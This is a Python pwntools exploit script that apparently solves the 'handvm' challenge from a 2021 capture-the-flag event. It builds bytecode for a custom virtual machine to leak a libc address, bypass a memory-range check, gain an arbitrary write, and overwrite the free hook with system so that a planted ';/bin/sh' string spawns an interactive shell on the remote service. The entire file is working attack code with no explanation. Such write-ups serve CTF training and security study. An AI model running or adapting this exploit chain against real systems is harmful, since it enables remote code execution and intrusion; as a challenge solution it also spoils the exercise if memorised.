from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './handvm'
# HOST = '172.17.0.2'
# PORT = 9999
HOST = 'handvm.2021.3k.ctf.to'
PORT = 7777

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def movim(reg, value):
	data = '\xa0'
	data += chr(reg)
	data += p64(value)
	return data

def mov(dst, src):
	data = '\xa1'
	data += chr(dst)
	data += chr(src)
	return data

def load(dst, src):
	data = '\xa2'
	data += chr(dst)
	data += chr(src)
	return data

def store(dst, src):
	data = '\xa3'
	data += chr(dst)
	data += chr(src)
	return data

def add(dst, src):
	data = '\xa4'
	data += chr(dst)
	data += chr(src)
	return data
def sub(dst, src):
	data = '\xa5'
	data += chr(dst)
	data += chr(src)
	return data
def push(reg):
	data = '\xa6'
	data += chr(reg)
	return data
def pop(reg):
	data = '\xa7'
	data += chr(reg)
	return data
def beq(off):
	data = '\xaa'
	data += p64(off)
	return data
def bneq(off):
	data = '\xab'
	data += p64(off)
	return data
def rcmp(dst, src):
	data = '\xa9'
	data += chr(dst)
	data += chr(src)
	return data

def sc():
	data = '\xa8'
	return data

def sys_read(fd, buf, leng):
	data = ''
	data += movim(0, 0)
	data += movim(1, fd)
	data += movim(2, buf)
	data += movim(3, leng)
	data += sc()
	return data

def sys_write(fd, buf, leng):
	data = ''
	data += movim(0, 1)
	data += movim(1, fd)
	data += movim(2, buf)
	data += movim(3, leng)
	data += sc()
	return data

r = start()
if args.D:
	debug(r, [])

payload = ''

# set command
payload += '\xa0'+";/bin/sh\x00"

# leak
payload += push(0xfc)
payload += pop(0)
payload += movim(1, 0xdead000)
payload += store(1, 0)
payload += sys_write(1, 0xdead000, 8)

# overwrite check range
payload += movim(1, 0x1000000000000000)
payload += push(1)
payload += pop(9)

# aaw
payload += sys_read(0, 0xdead000, 0x10)
payload += movim(1, 0xdead000)
payload += load(0, 1) # fh to reg0
payload += movim(1, 0xdead008)
payload += load(2, 1) # system to reg2
payload += store(0, 2) # system to fh

r.sendafter('> ', payload)

r.recvuntil('start\n')
leak = u64(r.recv(8))
dbg('leak')
base = leak - 0x1ec5c0
dbg('base')
fh = base + 0x1eeb28
system = base + 0x55410
r.send(flat(fh, system))
r.interactive()
r.close()
